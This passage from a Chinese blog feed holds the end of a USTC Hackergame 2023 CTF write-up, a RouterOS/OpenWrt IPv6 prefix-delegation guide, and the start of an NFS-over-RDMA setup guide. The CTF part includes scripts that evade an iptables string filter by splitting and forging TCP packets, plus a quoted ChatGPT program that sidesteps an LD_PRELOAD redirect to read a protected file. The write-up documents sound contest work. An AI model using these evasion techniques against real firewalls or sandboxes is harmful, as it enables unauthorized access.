视频的长宽需要自己猜，只要宽度猜的差不多了基本都能看出flag（感觉我猜的宽度似乎也不太对，不过已经能分辨出来了），可以从常见的视频长宽里一个一个测试（但没想到出题用的原始视频是竖着的，因此看起来比较怪）。\nrestored video flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC} 低带宽星球 小试牛刀 转换成svg就行（但依然达不到第二问50byte的要求）：\n\u0026lt;svg\u0026gt;\u0026lt;path fill=\u0026#34;#d92034\u0026#34; d=\u0026#34;M0 0h380v1024H0z\u0026#34;/\u0026gt;\u0026lt;path fill=\u0026#34;#f1885d\u0026#34; d=\u0026#34;M380 0h317v1024H380z\u0026#34;/\u0026gt;\u0026lt;path fill=\u0026#34;#d50415\u0026#34; d=\u0026#34;M697 0h327v1024H697z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt; 笔者尝试过的几种常见的无损压缩格式输出的图片大小：\nType Size PNG ~2kb AVIF (AV1) ~2kb HEIF (HEVC) 552b WEBP (VP8) 176b EPS ~300b SVG 170b SVGZ (GZIP) 120b 笔者当时也尝试了JPEG XL和他的前身FLIF，不过尝试都集中在了怎么让他用不同的分辨率编码亮度和颜色信息等，现在看来反而是研究imagemagick的canvas指令比较符合题目的想法。\nKomm, süsser Flagge 我的 POST iptables的string filter只在一个包内匹配，把PO和ST分开发就行。\nimport socket def send_http_request(): # 创建一个socket对象 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 连接到服务器 s.connect((\u0026#34;202.38.93.111\u0026#34;, 18081)) # 发送请求的第一部分 request_part1 = \u0026#34;PO\u0026#34; s.sendall(request_part1.encode()) # 发送请求的第二部分 request_part2 = \u0026#34;ST / HTTP/1.1\\r\\nHost: 202.38.93.111:18080\\r\\nContent-Length: 100\\r\\n\\r\\k=\u0026#34; s.sendall(request_part2.encode()) # 接收响应 response = s.recv(4096) print(response.decode()) # 关闭socket s.close() send_http_request() 我的 P 不知道为啥，用第一问的代码也过了。\n我的 GET（非预期） -A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string \u0026#34;GET / HTTP\u0026#34; -j ACCEPT -A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset 这两行iptables的意思大概是只允许包前50个byte含有GET / HTTP的包通过，因此我们在SYN，SYNACK的时候都需要把GET / HTTP塞进包里面。笔者尝试用scapy构造了TCP包。\n最开始笔者打算用HTTP Pipelining，在发SYNACK的时候直接把GET和POST一起发过去，不过发现go的http库似乎不太支持这样的行为，只能返回第一个GET的结果，因此后来尝试了把GET / HTTP塞进TCP Options里（笔者也尝试过塞IP Options里，不过option似乎会被链路上的某些路由器丢掉，所以就改用了TCP Options了），这样倒也不会让那个go程序把误认为我在GET了。\nfrom scapy.all import * import random # 设置目标IP和端口 sport = 13377 dport = 18082 src = \u0026#34;SRC-IP\u0026#34; dst = \u0026#34;202.38.93.111\u0026#34; iface = \u0026#34;eth0\u0026#34; pld = b\u0026#34;GET / HTTP\u0026#34; tcpopt = b\u0026#34;\\xfa%s%s\u0026#34; % ((len(pld)+2).to_bytes(), pld) # length 12 ether = Ether(type=0x800, dst=\u0026#34;MAC ADDR\u0026#34;, src=\u0026#34;MAC ADDR\u0026#34;) ip = IP(src=src, dst=dst) seqstart = random.randint(1000,5000) # 构建并发送SYN包 SYN = TCP(sport=sport, dport=dport, flags=\u0026#39;S\u0026#39;, seq=seqstart) xsyn = ether / ip / SYN / \u0026#34;GET / HTTP\u0026#34; packet = xsyn.build() sendp(packet, iface=iface, verbose=0) # 直接接收从目标IP地址返回的第一个包 syn_ack = sniff(iface=iface, filter=f\u0026#34;ip src {dst}\u0026#34;, count=1, timeout=5) if not syn_ack: print(\u0026#34;SYN-ACK not received.\u0026#34;) sys.exit() syn_ack = syn_ack[0] print(syn_ack) # 构建并发送ACK包 ACK = TCP(sport=sport, dport=dport, flags=\u0026#39;A\u0026#39;, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, options=[(66, \u0026#34;GET / HTTP\u0026#34;), (\u0026#34;EOL\u0026#34;, None)]) http_payload = \u0026#34;GET / HTTP/1.1\\r\\nHost: a\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nX-A: GET / HTTP\\r\\nHost: srv\\r\\nContent-Length: 15\\r\\n114514:asdfgh==\\r\\n\\r\\n\u0026#34; xack = ether / ip / ACK / http_payload sendp(xack.build(), iface=iface, verbose=1) 在运行之前可能需要用iptables丢掉客户端往服务端发的RST和服务端往客户端发的RST，以免让客户端发出的reset（检测到不规范的tcp包时客户端会发出）影响服务端，可参考linux - How to make all outgoing RST drop - Stack Overflow\n为什么要打开 /flag 😡 LD_PRELOAD, love! 根据题目本身的提示，这题可能和出题人编译的那个so文件被加进了LD_PRELOAD有关，那我们提交上去的程序刻意无视他就行。这道题由于笔者不太懂系统调用，因此这样问了chatgpt：\n``` stage1.so的代码 ``` 我的CTF比赛里有一道题，主办方提供了一个stage1.so(上方代码），把打开/flag的请求都定向到/fakeflag了，这是dockerfile： ``` COPY --from=builder /lib.so /stage1.so ENV STAGE=1 RUN echo \u0026#34;I\u0026#39;ll not let you open /flag again!\u0026#34; \u0026gt; /fakeflag RUN echo \u0026#34;Upload your binary to server to get real flag!\u0026#34; \u0026gt; /flag ``` 主办方提示这道题可能和LD_PRELOAD有关。你能帮我写一个linux ELF文件，来做到这点以及读一下flag的内容并打印吗。请注意，我只能上传一个ELF文件到主办方的这个docker执行，而且我没有办法在它的shell里设置任何LD变量。 chatgpt的回答：\n由于您提到无法在主办方的Docker环境中设置任何LD变量，您需要使用一种不依赖于环境变量的方法来绕过`stage1.so`的限制。幸运的是，有一种方法可以做到这一点：您可以直接在ELF文件中修改动态链接器的搜索路径。 下面是一种可能的解决方案： 1. 编写一个C程序，该程序尝试打开并读取`/flag`文件的内容。 2. 在C程序中，添加一个构造函数（使用`__attribute__((constructor))`），在主函数执行之前调用这个函数。在这个构造函数中，使用`dlopen`和`dlsym`来直接调用原始的文件打开和读取函数，绕过`stage1.so`的重定向。 3. 编译这个程序，生成一个ELF文件。 4. 使用`patchelf`或其他工具修改ELF文件，将动态链接器的搜索路径设置为一个不存在的路径。这样，当您的程序尝试加载`stage1.so`时，它将找不到该库，从而绕过了重定向。 下面是一个示例C程序，它尝试打开并读取`/flag`文件的内容，并在构造函数中绕过`stage1.so`的限制： ```c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; __attribute__((constructor)) void preload() { void *handle = dlopen(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, RTLD_LAZY); if (!handle) { fprintf(stderr, \u0026#34;Cannot open libc.so.6: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } FILE *(*original_fopen)(const char *, const char *) = dlsym(handle, \u0026#34;fopen\u0026#34;); if (!original_fopen) { fprintf(stderr, \u0026#34;Cannot find fopen: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } FILE *fp = original_fopen(\u0026#34;/flag\u0026#34;, \u0026#34;r\u0026#34;); if (!fp) { fprintf(stderr, \u0026#34;Cannot open /flag\\n\u0026#34;); exit(EXIT_FAILURE); } char buf[1024]; if (fgets(buf, sizeof(buf), fp) != NULL) { printf(\u0026#34;/flag content: %s\u0026#34;, buf); } else { fprintf(stderr, \u0026#34;Cannot read from /flag\\n\u0026#34;); } fclose(fp); dlclose(handle); } int main() { printf(\u0026#34;If you see this message, the constructor has finished executing.\\n\u0026#34;); return 0; } ``` 编译这个程序： ```bash gcc -o myprogram myprogram.c -ldl ``` 然后使用`patchelf`修改ELF文件： ```bash patchelf --set-rpath /nonexistent myprogram ``` 这样，当您上传并执行这个ELF文件时，它应该能够绕过`stage1.so`的限制，直接打开并读取`/flag`文件的内容。 ChatGPT的思路应该是制定了一个不存在动态链接器的搜索路径（本质应该和LD_PRELOAD类似），这样程序就会无视现有的LD_PRELOAD里的so文件了。\n没想到把ChatGPT的代码交上去之后就一次拿到flag了。\n异星歧途 下载游戏玩一玩之后，可以注意到每8个开关都是由一个processor控制的。\n处理器的关联建筑 点进编辑之后可以看到若干逻辑图，或者也可以复制出文本看。\n逻辑界面 第一组 sensor s1 switch1 @enabled sensor s2 switch2 @enabled sensor s3 switch3 @enabled sensor s4 switch4 @enabled sensor s5 switch5 @enabled sensor s6 switch6 @enabled sensor s7 switch7 @enabled sensor s8 switch8 @enabled jump 18 equal s1 false jump 18 equal s2 true jump 18 equal s3 false jump 18 equal s4 true jump 18 equal s5 true jump 18 equal s6 false jump 18 equal s7 true jump 18 equal s8 false control enabled generator1 1 0 0 0 end control enabled generator1 0 0 0 0 end 可以看出S1到S8需要按照10100101配置就能启动generator1。\n第二组 sensor sw1 switch1 @enabled sensor sw2 switch2 @enabled sensor sw3 switch3 @enabled sensor sw4 switch4 @enabled sensor sw5 switch5 @enabled sensor sw6 switch6 @enabled sensor sw7 switch7 @enabled sensor sw8 switch8 @enabled op shl t sw1 7 set number t op shl t sw2 6 op add number number t op shl t sw3 5 op add number number t op shl t sw4 4 op add number number t op shl t sw5 3 op add number number t op shl t sw6 2 op add number number t op shl t sw7 1 op add number number t set t sw8 op add number number t set en 0 set i 0 jump 33 greaterThanEq i 16 op pow fl0 i 2 jump 31 notEqual fl0 number set en 1 jump 33 always x false op add i i 1 jump 26 always x false op equal fl1 0 sw1 op equal fl2 0 sw6 op or fl3 fl1 fl2 jump 38 equal fl3 0 set en 0 control enabled generator1 en 0 0 0 control enabled panel1 en 0 0 0 end number是用位移生成的，大概类似于number = sw1*128 + sw2*64 + sw3*32 + sw4*16 + sw5*8 + sw6*4 + sw7*2 + sw8*1，然后number需要是一个小于225的平方数。 sw1和sw6需要是开状态（相当于已经有128+4=132了），注意到196=14^2；196-132=64，那打开sw2就可以了。 11000100\n第三组 sensor sw1 switch1 @enabled sensor sw2 switch2 @enabled sensor sw3 switch3 @enabled sensor sw4 switch4 @enabled sensor sw5 switch5 @enabled sensor sw6 switch6 @enabled sensor sw7 switch7 @enabled sensor sw8 switch8 @enabled sensor sw9 switch9 @enabled control enabled conveyor2 sw1 0 0 0 control enabled gate1 sw2 0 0 0 op equal nsw3 sw3 0 control enabled reactor1 nsw3 0 0 0 control enabled reactor2 nsw3 0 0 0 control enabled conduit1 sw4 0 0 0 control enabled conduit2 sw4 0 0 0 control enabled mixer1 sw5 0 0 0 control enabled extractor1 sw6 0 0 0 control enabled meltdown1 sw7 0 0 0 control enabled meltdown2 sw7 0 0 0 op equal result sw8 sw9 jump 28 equal result true control enabled mixer1 0 0 0 0 control enabled conduit2 1 0 0 0 control enabled reactor1 1 0 0 0 control enabled reactor2 1 0 0 0 control enabled conveyor2 1 0 0 0 wait 5 end 目标：打开extractor1，mixer1，reactor1，reactor2，conveyor2，gate1，但不能打开conduit1，conduit2\n1-8 行：定义了8个传感器，并将它们连接到各自的开关（switch1 - switch9）上，这些开关被命名为sw1到sw9。\n9-14 行：这些行设置了几个建筑的控制逻辑。control enabled 命令用于启用或禁用特定的建筑。建筑的启用/禁用状态取决于相应传感器的状态（0代表禁用，1代表启用）。在这些行中，当传感器的状态为1（即开关被激活）时，相应的建筑会被启用。\n15-16 行：创建了一个名为nsw3的新变量，并将其值设置为与sw3相等。这意味着nsw3的值将根据sw3的状态变化。\n17-20 行：当nsw3为1（即sw3被激活）时，启用reactor1、reactor2、conduit1和conduit2。\n21-23 行：当sw5为1时，启用mixer1；当sw6为1时，启用extractor1；当sw7为1时，启用meltdown1和meltdown2。——打开sw5，sw6\n24-26 行：比较sw8和sw9的状态，并将结果存储在变量result中。如果sw8和sw9都是1或都是0，result将为true。——sw8已经关了，所以sw9也要关上\n27 行：如果result为true（即sw8和sw9的状态相等），则跳转到第28行。\n28-33 行：如果跳转发生，这些行将被执行。这些行将禁用mixer1，启用conduit2、reactor1、reactor2和conveyor2。\n34 行：等待5个游戏逻辑帧。\n35 行：脚本结束。\nsw1控制conveyor2。——打开sw1\n10001100\n其他方法：服务器允许10秒提交一次序列，8位二进制数一共就256种组合，运行一个小时就能撞出来了\n第四组 正好试出来了01110111\n成功运行后的状态 没做出，但尝试过的部分 小型大语言模型星球 Hackergame和🐮 尝试了把hackergame token化，会被拆成h, acker, game。不过训练集里的acker对应的单词基本都是cracker。到此就没有思路了。\n低带宽星球 极致压缩 尝试了若干种libvips支持的无损压缩格式，无果，甚至尝试了imagemagick的canvas，不过libvips并不支持。怀疑正确的解题方法应该是上传某种特地构造的二进制。\nType Size PNG ~2kb AVIF (AV1) ~2kb HEIF (HEVC) 552b WEBP (VP8) 176b EPS ~300b SVG 170b SVGZ (GZIP) 120b O(1) 用户登录系统 在网上找到了这篇文章：Attacking Merkle Trees with a second preimage attack | Hacker News (ycombinator.com)，但构造新的，具有一致hash的Merkle tree（个人认为算Second-preimage attack？）也是一件计算密集的事情。\n有关撞SHA1笔者也找到了SHA1 - CTF Wiki (ctf-wiki.org)这篇文章，其中提到可以用google提供的那两个SHA1一致的PDF创建一个SHA1一样的文件，但这个文件至少要320bytes，不符合文中提到的帐号密码长度要小于100的要求（而且也不包含:）\n小 Z 的谜题 这道题理论上应该可以转成立体几何或者3D Bin Packing问题，但这是个NP Hard问题，自己尝试了一些用近似算法的软件或着自己做也没能做出来，最接近的结果是下面这张图（差了一个1*2*2的方块）:\n画出来的拼接方案 标准解答方案的可视化： ","permalink":"https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/","summary":"\u003cp\u003e这是本人第四次参加USTC的hackergame了233，有赖今年许多题目正好和运维和\u003cdel\u003e环境学\u003c/del\u003e知识相关和\u003cdel\u003eChatGPT的横空出世\u003c/del\u003e，本人的排名总算第一次进了前100。\u003c/p\u003e","title":"USTC Hackergame 2023 Writeup"},{"content":"在中国大陆，电信运营商常为使用PPPoE拨号的用户分配/60的IPv6 prefix delegation。在本文中，笔者尝试了使用Mikrotik RouterOS获取了电信运营商分配的IPv6 PD，并为下级路由器和PPP接口上的设备继续分发了/64的IPv6 PD。\nDALLE - photo of two routers connected by a cable. One router has a label \u0026lsquo;OpenWRT\u0026rsquo; and the other \u0026lsquo;Mikrotik RouterOS\u0026rsquo;. Above them is a cloud symbol with \u0026lsquo;IPv6 地址分配结构 Internet | | (WAN) | IPv6 Prefix: 240e:abc:1234:1950::/60 | MikroTik Router (pppoe-telecom) | | (LAN - bridge-eoip) | IPv6 Address: 240e:abc:1234:1950:20c:29ff:fefe:c01e/64 | |----------------|----------------|----------------|----------------| Device 1 Device 2 Device 3 Device 4 IPv6 Prefix: IPv6 Prefix: IPv6 Prefix: IPv6 Prefix: 240e:3b6:30f0: 240e:3b6:30f0: 240e:3b6:30f0: 240e:3b6:30f0: 1950::/64 1951::/64 1952::/64 1953::/64 配置DHCPv6 Client （RouterOS） 首先确保已经在RouterOS上创建好了PPPoE / DHCP interface ，并已经拿到了ipv4地址。随后先添加一个IPv6的DHCP client：\n/ipv6 dhcp-client add add-default-route=yes interface=pppoe-telecom pool-name=delegation pool-prefix-length=64 add-default-route=no request=prefix 这里的pool-prefix-length根据运营商分配的v6 prefix的长度决定，并且**决定了下文中 DHCPv6 服务器下发前缀的长度（或者说二级路由器拿到的前缀的长度）。**一般是max(64,ISP-v6-prefix + 4)，笔者从电信拿到的是/60的prefix，因此就设置了64的pool-prefix-length。在这种情况下，ROS应该能为下级设备分配16个/64的PD。\n获取到地址后，ROS这边会显示“bound”，并且ipv6的pool里也会出现这个地址：\n[admin@MikroTik] \u0026gt; /ipv6 dhcp-client print Flags: X - DISABLED, I - INVALID Columns: INTERFACE, STATUS, REQUEST, PREFIX # INTERFACE STATUS REQUEST PREFIX 0 pppoe-telecom bound prefix 240e:abc:1234:1950::/60, 2d23h56m3s [admin@MikroTik] \u0026gt; /ipv6 pool print Flags: D - DYNAMIC Columns: NAME, PREFIX, PREFIX-LENGTH, EXPIRES-AFTER # NAME PREFIX PREFIX-LENGTH EXPIRES-AFTER 0 D delegation 240e:abc:1234:1950::/60 64 2d13h7m17s 为ROS添加IPv6 Address（RouterOS） 随后，我们可以为ROS的LAN添加一个v6地址用于ROS的v6连接：\n/ipv6 address add address=::/64 from-pool=delegation interface=bridge-eoip advertise=yes eui-64=yes 这里使用eui-64=yes的原因是使用接口的MAC生成地址的后64位，防止ROS拿到的IPv6地址和第一个PD Pool里网关的地址冲突。（比如在笔者的环境下，ROS就给bridge-eoip接口分配了240e:abc:1234:1950:20c:29ff:fefe:c01e/64，而不是可能和下一级PD网关（Openwrt）冲突的240e:abc:1234:1950::1/64。 添加后可以用/ipv6 address print检查一下接口是不是已经获取到了ipv6地址。\n在本地接口上配置 IPv6 PD 服务器 （RouterOS） 在IPv6的DHCP Server部份创建一个服务器即可（lease-time可以自行控制）：\n/ipv6 dhcp-server add address-pool=delegation interface=bridge-eoip lease-time=12h name=dhcpv6-lan 在PPP（包括PPTP，L2TP等）上配置 IPv6 PD 服务器 （RouterOS） 可以参考mikrotik的wiki，在PPP profile里添加dhcpv6-pd-pool即可：\n/ppp profile set default dhcpv6-pd-pool=delegation 配置Openwrt上的DHCPv6 PD Client 笔者自己的Openwrt设备需要进行下述的配置才能正常使用IPv6 PD。但笔者尝试创建了一台新的Openwrt 23.05.0虚拟机，使用默认配置就立即获取到了RouterOS提供的IPv6 PD。因此下述的配置仅供参考（可能是不必要的），如果默认设置获取不到PD，请再尝试下面的配置。 /etc/config/network :\nconfig interface \u0026#39;lan\u0026#39; ... option ip6assign \u0026#39;64\u0026#39; config interface \u0026#39;wan6\u0026#39; option proto \u0026#39;dhcpv6\u0026#39; option device \u0026#39;your-wan-interface\u0026#39; option reqaddress \u0026#39;try\u0026#39; option reqprefix \u0026#39;auto\u0026#39; option extendprefix \u0026#39;1\u0026#39; Further below, I found this interesting part 7 that talks about RFC 7278 5. This seemed to be exactly what I wanted - extending the /64 prefix that is recieved on the WAN. On inspecting using my custom script, I noticed that the $EXTENDPREFIX variable was not set. Where did this come from? ——Openwrt Forum\n这里的extendprefix用于在WAN接口上接收到的IPv6前缀之上扩展一个额外的前缀。但这个选项无法在GUI配置，需要手动配置network文件。\n/etc/config/dhcp :\nconfig dhcp \u0026#39;lan\u0026#39; ... option dhcpv6 \u0026#39;server\u0026#39; option ra \u0026#39;server\u0026#39; list ra_flags \u0026#39;managed-config\u0026#39; list ra_flags \u0026#39;other-config\u0026#39; option ndp \u0026#39;relay\u0026#39; option dns_service \u0026#39;0\u0026#39; config dhcp \u0026#39;wan6\u0026#39; option interface \u0026#39;wan6\u0026#39; option ignore \u0026#39;1\u0026#39; option master \u0026#39;1\u0026#39; option ndp \u0026#39;relay\u0026#39; 同时，WAN和LAN接口也要启用NDP relay才能正确使用这个/64的prefix，以确保LAN接口上的设备可以看到并与WAN接口上的设备通信。\n如果希望更换自己拿到的PD的prefix/希望固定自己拿到的prefix，可以手动配置IAID（参考Openwrt论坛上的这篇文章），在network文件的WAN6那一节里加上option reqprefix '64:2'这样的配置就行（64代表请求64位的prefix，2代表IAID设置成2），IAID可以是一个4字节的值。\nDHCPv6的duid同样可以通过option clientid '0003000138822FFE7DF0'这样的配置项手动指定。\n配置效果 在正确配置后，Openwrt 的web管理界面中，wan6 interface上应该有一个/64的PD prefix，一个SLAAC分配的64位地址，lan接口上应该也有一个DHCPv6分配的64位地址：\nWAN6：\nProtocol: DHCPv6 client Uptime: 11h 8m 0s RX: 487.24 MB (295262 Pkts.) TX: 45.34 MB (295588 Pkts.) IPv6: 240e:abc:1234:1950:d804:5eff:fe51:3fe0/64 IPv6-PD: 240e:abc:1234:1950::/64 LAN：\nProtocol: Static address Uptime: 11h 8m 42s RX: 55.52 MB (350320 Pkts.) TX: 616.28 MB (515726 Pkts.) IPv4: ... IPv6: 240e:abc:1234:1950::1/64 此时，在RouterOS上，应该也能看到相应的dhcp-server binding：\n[admin@MikroTik] \u0026gt; /ipv6 dhcp-server binding print Flags: D - DYNAMIC Columns: ADDRESS, DUID, SERVER, STATUS # ADDRESS DUID SERVER STATUS 0 D 240e:abc:1234:1950::/64 0x.... dhcpv6-telecom-lan bound MTU问题 如果遇到了IPv6上网慢，打不开某些https网站的话，可以检查一下Openwrt上是否打开了MSS Clamping，ROS上是否有MSS Clamping的规则。\n/ipv6 firewall mangle add chain=forward action=change-mss new-mss=clamp-to-pmtu passthrough=yes protocol=tcp tcp-flags=syn /ipv4 firewall mangle add chain=forward action=change-mss new-mss=clamp-to-pmtu passthrough=yes protocol=tcp tcp-flags=syn 参考 在 Mikrotik RouterOS 6.48.2 上配置 DHCPv6-PD（前缀代理） - I’m Renjie Wu\nDHCPv6 from upstream /64 prefix from ISP\u0026rsquo;s LTE router - #2 by ManasSam - Network and Wireless Configuration - OpenWrt Forum\nManual:IPv6 PD over PPP - MikroTik Wiki\nManual:IPv6/Address - MikroTik Wiki\nOpenWRT IPv6 + 二级路由折腾\n家用宽带的IPv6配置 - TimeForget (lwz322.github.io)\nOpenwrt 和 MikroTik RouterOS 路由器通过 IPIP/EOIP 进行二层组网 | Sparktour\u0026rsquo;s\nMAC Address and Client ID / IAID\n","permalink":"https://blog.sparktour.me/posts/2023/10/18/mikrotik-routeros-openwrt-ipv6-prefix-delegation/","summary":"\u003cp\u003e在中国大陆，电信运营商常为使用PPPoE拨号的用户分配\u003ccode\u003e/60\u003c/code\u003e的IPv6 prefix delegation。在本文中，笔者尝试了使用Mikrotik RouterOS获取了电信运营商分配的IPv6 PD，并为下级路由器和PPP接口上的设备继续分发了\u003ccode\u003e/64\u003c/code\u003e的IPv6 PD。\u003c/p\u003e","title":"使用 Mikrotik RouterOS 和 Openwrt 在 ISP 获得的 IPv6 Prefix 上配置二级 PD "},{"content":"笔者的实验室于近期购置了8块nvme硬盘，通过pcie转接卡转接至一台服务器，并用ZFS组了RAID。为了能让实验室的其他服务器也能快速访问主机上的存储池，笔者去闲鱼套了两块ConnectX-4 CX4121A 10Gbe 的万兆网卡用来连接两台服务器，并配置了NFS Over RDMA。\n闲鱼的卖家没有附带光模块，笔者随意买了两个华为的10G模块，大概15-20元一个。\n安装驱动 前往nvidia的官网下载NVIDIA Firmware Tools (MFT)，根据自己的系统选安装包，笔者实验室用的都是ubuntu，就下载了mft-4.25.0-62-x86_64-deb.tgz。\n下载完后运行安装包内的install.sh即可。\n安装完后通过mst start启动MST，然后用mst status就能看到自己的卡了，此时电脑上应该也会多出光卡对应的NIC。\n# mst status MST modules: ------------ MST PCI module is not loaded MST PCI configuration module loaded MST devices: ------------ /dev/mst/mt4117_pciconf0 - PCI configuration cycles access. domain:bus:dev.fn=0000:04:00.0 addr.reg=88 data.reg=92 cr_bar.gw_offset=-1 Chip revision is: 00 如果网卡只用做服务器之间的互联，可以分别为两段的服务器配置静态IP和路由。\n更新固件 前往nvidia的固件下载页下载对应的zip（注意区分自己的卡是以太网卡还是IB卡）。\n找到自己的设备（/dev/mst开头的），用flint -d \u0026lt;device_name\u0026gt; -i \u0026lt;binary image\u0026gt; burn刷入固件。\n安装MLNX_OFED 虽然笔者买的是以太网卡，但Mellanox的RDMA内核模块需要去给IB卡提供的MLNX_OFED包里安装。MLNX_OFED也可以在Nvidia官网下载。笔者直接下了最新的MLNX_OFED_LINUX-23.07-0.5.0.0-ubuntu22.04-x86_64.tgz，没有下LTS版本。\n下载完解压后，运行里面的\n./mlnxofedinstall 即可。\n随后还要手动安装里面的NFS-RDMA内核模块，一般这个包位于./DEBS/mlnx-**nfs**rdma-dkms_23.04-OFED.23.04.0.5.3.1_all.deb的位置，也可以用find . | grep nfs | grep .deb找到。随后dpkg -i ./DEBS/mlnx-**nfs**rdma-dkms_23.04-OFED.23.04.0.5.3.1_all.deb即可。期间需要DKMS需要build内核模块，请耐心等待。\n安装NFS Server 在服务器一端安装NFS Server\napt install nfs-kernel-server systemctl start nfs-kernel-server.service 在启动NFS之前需要mount相应的内核模块，以及把RDMA用的端口加进NFS的portlist：\n/sbin/modprobe rpcrdma echo \u0026#39;rdma 20049\u0026#39; | tee /proc/fs/nfsd/portlist 如果想之后自动进行可以直接修改/lib/systemd/system/nfs-kernel-server.service（主要是加ExecStartPre和ExecStartPost：\n[Unit] Description=NFS server and services DefaultDependencies=no Requires=network.target proc-fs-nfsd.mount Requires=nfs-mountd.service Wants=rpcbind.socket network-online.target Wants=rpc-statd.service nfs-idmapd.service Wants=rpc-statd-notify.service Wants=nfsdcld.service After=network-online.target local-fs.target After=proc-fs-nfsd.mount rpcbind.socket nfs-mountd.service After=nfs-idmapd.service rpc-statd.service After=nfsdcld.service Before=rpc-statd-notify.service # GSS services dependencies and ordering Wants=auth-rpcgss-module.service After=rpc-gssd.service gssproxy.service rpc-svcgssd.service [Service] Type=oneshot RemainAfterExit=yes ExecStartPre=-/usr/sbin/exportfs -r ExecStartPre=/sbin/modprobe rpcrdma ExecStart=/usr/sbin/rpc.nfsd ExecStartPost=/bin/bash -c \u0026#34;sleep 3 \u0026amp;\u0026amp; echo \u0026#39;rdma 20049\u0026#39; | tee /proc/fs/nfsd/portlist\u0026#34; ExecStop=/usr/sbin/rpc.nfsd 0 ExecStopPost=/usr/sbin/exportfs -au ExecStopPost=/usr/sbin/exportfs -f ExecReload=-/usr/sbin/exportfs -r [Install] WantedBy=multi-user.target 随后systemctl daemon-reload并重启nfs服务。此时在NFS的监听端口里应该能看到普通nfs用的2049和RDMA的20049了：\n# cat /proc/fs/nfsd/portlist rdma 20049 rdma 20049 tcp 2049 tcp 2049 添加暴露的挂载目录 编辑/etc/exports，如果对于ZFS文件系统，也可以直接执行如下命令（意思是允许7.0.115.0/24访问pool-name这个pool）：\nzfs set sharenfs=\u0026#34;rw=@7.0.115.0/24,no_root_squash,async\u0026#34; pool-name 随后通过exportfs -v检查，可以看到相应的目录已经被暴露了：\n# exportfs -v /data/pool-name 7.0.115.0/24(async,wdelay,hide,no_subtree_check,mountpoint,sec=sys,rw,secure,no_root_squash,no_all_squash) 客户端操作 客户端在挂载前同样需要挂载rpcrdma，这个命令也可以写在systemctl的ExecStartPre=里：\nmodprobe rpcrdma 随后进行挂载：\nmount 7.0.115.1:/data/pool-name /data/pool-name -o rdma,port=20049,async,noatime,nodiratime -vvvv 如果一切没有问题则可以在/etc/fstab里添加：\n7.0.115.1:/data/pool-name /data/pool-name nfs rdma,port=20049,async,noatime,nodiratime 0 0 测速 用fio测试顺序写入速度：\nfio --name=testfile --directory=/data/pool-name/speedtest --size=2G --numjobs=10 --rw=write --bs=1000M --ioengine=libaio --fdatasync=1 --runtime=60 --time_based --group_reporting --eta-newline=1s 可以看到写入速度能够跑满10G网卡（1078MiB/s），同时测速时通过iftop在网卡上看不到任何流量，说明NFS的流量已经直接经过RDMA传输了。\ntestfile: (groupid=0, jobs=10): err= 0: pid=3968057: Thu Aug 24 08:00:00 2023 write: IOPS=1, BW=1078MiB/s (1130MB/s)(67.4GiB/64006msec); 0 zone resets slat (msec): min=328, max=6801, avg=3973.96, stdev=1633.37 clat (nsec): min=1780, max=12590, avg=3690.00, stdev=1745.87 lat (msec): min=328, max=6801, avg=3973.96, stdev=1633.37 clat percentiles (nsec): | 1.00th=[ 1784], 5.00th=[ 2064], 10.00th=[ 2192], 20.00th=[ 2800], | 30.00th=[ 2928], 40.00th=[ 3088], 50.00th=[ 3280], 60.00th=[ 3408], | 70.00th=[ 3824], 80.00th=[ 4576], 90.00th=[ 4896], 95.00th=[ 6688], | 99.00th=[12608], 99.50th=[12608], 99.90th=[12608], 99.95th=[12608], | 99.99th=[12608] bw ( MiB/s): min=19984, max=20000, per=100.00%, avg=19997.62, stdev= 0.93, samples=64 iops : min= 16, max= 20, avg=19.40, stdev= 0.23, samples=64 lat (usec) : 2=2.90%, 4=71.01%, 10=24.64%, 20=1.45% fsync/fdatasync/sync_file_range: sync (nsec): min=20, max=9970, avg=597.50, stdev=1058.05 sync percentiles (nsec): | 1.00th=[ 20], 5.00th=[ 50], 10.00th=[ 110], 20.00th=[ 161], | 30.00th=[ 231], 40.00th=[ 382], 50.00th=[ 470], 60.00th=[ 532], | 70.00th=[ 612], 80.00th=[ 708], 90.00th=[ 948], 95.00th=[ 1464], | 99.00th=[ 9920], 99.50th=[ 9920], 99.90th=[ 9920], 99.95th=[ 9920], | 99.99th=[ 9920] cpu : usr=1.00%, sys=7.62%, ctx=1122377, majf=0, minf=141 IO depths : 1=233.3%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, \u0026gt;=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, \u0026gt;=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, \u0026gt;=64=0.0% issued rwts: total=0,69,0,0 short=92,0,0,0 dropped=0,0,0,0 latency : target=0, window=0, percentile=100.00%, depth=1 Run status group 0 (all jobs): WRITE: bw=1078MiB/s (1130MB/s), 1078MiB/s-1078MiB/s (1130MB/s-1130MB/s), io=67.4GiB (72.4GB), run=64006-64006msec Reference https://network.nvidia.com/files/doc-2020/pb-connectx-4-lx-en-card.pdf\nhttps://forums.developer.nvidia.com/t/how-to-use-nfs-over-rdma-with-mlnx-ofed-solution/207263\nhttps://docs.oracle.com/cd/E23824_01/html/821-1448/gayne.html\n","permalink":"https://blog.sparktour.me/posts/2023/08/24/mount-nfs-via-rdma-on-mlnx-card/","summary":"\u003cp\u003e笔者的实验室于近期购置了8块nvme硬盘，通过pcie转接卡转接至一台服务器，并用ZFS组了RAID。为了能让实验室的其他服务器也能快速访问主机上的存储池，笔者去闲鱼套了两块ConnectX-4 CX4121A 10Gbe 的万兆网卡用来连接两台服务器，并配置了NFS Over 